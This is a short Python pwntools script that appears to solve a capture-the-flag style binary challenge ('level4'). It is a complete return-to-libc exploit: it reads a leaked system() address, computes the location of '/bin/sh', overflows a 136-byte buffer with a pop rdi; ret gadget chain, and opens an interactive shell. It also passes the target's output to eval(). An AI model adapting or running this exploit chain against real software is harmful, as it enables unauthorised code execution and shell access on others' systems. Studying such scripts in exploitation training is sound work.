#!/usr/bin/python
from pwn import *

p = process('level4')
libc = ELF('libc.so.6')

system_addr = eval(p.readline())
log.info("system_addr = " + hex(system_addr))

offset = next(libc.search('/bin/sh')) - libc.symbols['system']
log.info("offset = " + hex(offset))

binsh = offset + system_addr
log.info("/bin/sh = " + hex(binsh))

pop_rdi_ret = 0x04008b3
payload = "A" * 136 + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
 
p.send(payload)

p.interactive()

